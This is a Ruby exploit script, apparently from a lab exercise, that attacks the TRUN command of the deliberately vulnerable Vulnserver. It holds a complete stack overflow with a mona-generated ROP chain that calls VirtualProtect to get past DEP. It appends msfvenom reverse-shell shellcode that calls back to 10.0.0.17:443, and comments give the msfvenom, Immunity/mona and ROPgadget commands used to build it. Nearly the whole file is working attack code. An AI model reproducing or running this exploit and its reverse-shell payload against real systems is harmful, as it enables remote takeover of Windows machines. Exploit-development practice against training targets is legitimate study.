#!/usr/bin/ruby
#encoding: ascii

require"socket"
ip = "10.0.0.7"
port = 9999

#root@kali:~/Desktop/vulnserver# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.0.0.17 EXITFUNC=thread -b "\x00" -n 16 -v shell -f ruby
#Payload size: 367 bytes
shell = 
"\xd6\xf5\x93\x92\x93\x9f\x98\x27\x42\x43\x37\x49\x90\x49" +
"\xd6\x93\xb8\xbc\x99\xa2\xd2\xdd\xc4\xd9\x74\x24\xf4\x5d" +
"\x29\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\xf9\x97\x40" +
"\x27\xfd\x40\x06\xc8\xfd\x90\x67\x40\x18\xa1\xa7\x36\x69" +
"\x92\x17\x3c\x3f\x1f\xd3\x10\xab\x94\x91\xbc\xdc\x1d\x1f" +
"\x9b\xd3\x9e\x0c\xdf\x72\x1d\x4f\x0c\x54\x1c\x80\x41\x95" +
"\x59\xfd\xa8\xc7\x32\x89\x1f\xf7\x37\xc7\xa3\x7c\x0b\xc9" +
"\xa3\x61\xdc\xe8\x82\x34\x56\xb3\x04\xb7\xbb\xcf\x0c\xaf" +
"\xd8\xea\xc7\x44\x2a\x80\xd9\x8c\x62\x69\x75\xf1\x4a\x98" +
"\x87\x36\x6c\x43\xf2\x4e\x8e\xfe\x05\x95\xec\x24\x83\x0d" +
"\x56\xae\x33\xe9\x66\x63\xa5\x7a\x64\xc8\xa1\x24\x69\xcf" +
"\x66\x5f\x95\x44\x89\x8f\x1f\x1e\xae\x0b\x7b\xc4\xcf\x0a" +
"\x21\xab\xf0\x4c\x8a\x14\x55\x07\x27\x40\xe4\x4a\x20\xa5" +
"\xc5\x74\xb0\xa1\x5e\x07\x82\x6e\xf5\x8f\xae\xe7\xd3\x48" +
"\xd0\xdd\xa4\xc6\x2f\xde\xd4\xcf\xeb\x8a\x84\x67\xdd\xb2" +
"\x4e\x77\xe2\x66\xc0\x27\x4c\xd9\xa1\x97\x2c\x89\x49\xfd" +
"\xa2\xf6\x6a\xfe\x68\x9f\x01\x05\xfb\xaa\xd5\x05\xea\xc2" +
"\xd7\x05\x0d\xa8\x51\xe3\x67\xde\x37\xbc\x1f\x47\x12\x36" +
"\x81\x88\x88\x33\x81\x03\x3f\xc4\x4c\xe4\x4a\xd6\x39\x04" +
"\x01\x84\xec\x1b\xbf\xa0\x73\x89\x24\x30\xfd\xb2\xf2\x67" +
"\xaa\x05\x0b\xed\x46\x3f\xa5\x13\x9b\xd9\x8e\x97\x40\x1a" +
"\x10\x16\x04\x26\x36\x08\xd0\xa7\x72\x7c\x8c\xf1\x2c\x2a" +
"\x6a\xa8\x9e\x84\x24\x07\x49\x40\xb0\x6b\x4a\x16\xbd\xa1" +
"\x3c\xf6\x0c\x1c\x79\x09\xa0\xc8\x8d\x72\xdc\x68\x71\xa9" +
"\x64\x88\x90\x7b\x91\x21\x0d\xee\x18\x2c\xae\xc5\x5f\x49" +
"\x2d\xef\x1f\xae\x2d\x9a\x1a\xea\xe9\x77\x57\x63\x9c\x77" +
"\xc4\x84\xb5"

#enable DEP for all app
#computer->property-adv system setings
#advance->performance->setting
#DEP->turn on DEP for all app
#restart

#find gadget with immunity
#open immunity as admin
#!mona rop -m essfunc -cp nonull	-> generate based on essfunc DLLs
					#not enough gadgets
#!mona rop -m "*.dll" -cp nonull	->use all DLLs
					#plenty of gadgets but most gets rebase after reboot
#output files in
#C:\Program Files\Immunity Inc\Immunity Debugger
#rop_chains.txt -> auto generated ropchain
#rop.txt -> gadgets


#ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
#----------------------------------------------------------

#*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x753b4bb5,  # POP ECX # RETN [mswsock.dll] 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x75c9fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x75dc564b,  # POP EBP # RETN [msvcrt.dll] 
      0x625011bb,  # & jmp esp [essfunc.dll]
      0x761729a4,  # POP EAX # RETN [RPCRT4.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x775d4802,  # NEG EAX # RETN [user32.dll] 
      0x75c9f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] 
      0x761527e7,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x775d4802,  # NEG EAX # RETN [user32.dll] 
      0x771fbd3a,  # XCHG EAX,EDX # RETN [kernel32.dll] 
      0x753b4b17,  # POP ECX # RETN [mswsock.dll] 
      0x75d05591,  # &Writable location [MSCTF.dll]
      0x75c9fa56,  # POP EDI # RETN [MSCTF.dll] 
      0x775d4804,  # RETN (ROP NOP) [user32.dll]
      0x77266ee9,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      0x778d3c64,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end

rop_chain = create_rop_chain()

payload = ""
payload << "A"*2003
payload << rop_chain
#payload << "\xcc"*60
payload << shell

TCPSocket.open(ip, port) do |s|
  puts s.gets
  s.print "TRUN /.:/#{payload}"		#seems /.:/ is important here
end

#find gadgets from kali
#pip install ropgadget
#ROPgadget --binary ./essfunc.dll --badbytes "00" > rop-essfunc.txt
